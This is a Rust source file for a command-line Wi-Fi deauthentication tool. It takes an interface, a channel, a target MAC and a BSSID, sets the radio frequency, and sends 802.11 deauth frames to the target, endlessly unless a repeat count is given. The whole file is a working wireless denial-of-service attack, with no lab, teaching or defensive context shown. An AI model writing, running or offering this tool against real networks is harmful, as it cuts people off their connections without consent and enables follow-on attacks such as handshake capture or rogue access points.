use std::{thread, time::Duration};

use airctl::{af_eth, helper::channel_to_freq, nl_gen};
use clap::Parser;

#[derive(Parser, Debug)]
#[command(author, version, about)]
struct Cli {
    /// Wireless interface
    #[arg(short, long)]
    interface: String,

    /// Channel
    #[arg(short, long)]
    channel: u16,

    /// Target
    #[arg(short, long)]
    target: String,

    /// BSSID
    #[arg(short, long)]
    bssid: String,

    /// Time Gap
    #[arg(short, long)]
    gap: Option<u64>,

    // Repeat
    #[arg(short, long)]
    repeat: Option<usize>,
}

fn main() {
    let cli = Cli::parse();

    let interface = cli.interface;
    let bssid = parse_mac(&cli.bssid);
    let target = parse_mac(&cli.target);
    let channel = cli.channel;
    let gap = cli.gap;
    let repeat = cli.repeat;

    let mut af_ctrl = af_eth::Ctrl::new(interface.clone());
    af_ctrl.sock_bind();

    thread::sleep(Duration::from_millis(200));
    let mut nl_ctrl = nl_gen::Ctrl::new(interface);
    nl_ctrl.bind();

    let freq = match channel_to_freq(channel) {
        Some(freq) => freq,
        None => panic!("Unsupported channel: {channel}"),
    };

    nl_ctrl.set_frequency(freq);
    af_ctrl.drain();

    match (gap, repeat) {
        (None, Some(r)) => {
            for _ in 0..r {
                af_ctrl.deauth(target, bssid);
                println!("Deauth Packet sent: {:?} -> {:?}", bssid, target);
                thread::sleep(Duration::from_millis(500));
            }
        }
        (Some(g), Some(r)) => {
            for _ in 0..r {
                af_ctrl.deauth(target, bssid);
                println!("Deauth Packet sent: {:?} -> {:?}", bssid, target);
                thread::sleep(Duration::from_millis(g));
            }
        }
        _ => loop {
            af_ctrl.deauth(target, bssid);
            println!("Deauth Packet sent: {:?} -> {:?}", bssid, target);
            thread::sleep(Duration::from_millis(500));
        },
    }
}

fn parse_mac(s: &str) -> [u8; 6] {
    let parts: Vec<&str> = s.split(':').collect();

    if parts.len() != 6 {
        panic!("MAC address must contain 6 bytes");
    }

    let mut mac = [0u8; 6];

    for (i, part) in parts.iter().enumerate() {
        mac[i] = u8::from_str_radix(part, 16)
            .map_err(|_| format!("Invalid MAC byte: {part}"))
            .unwrap();
    }
    mac
}
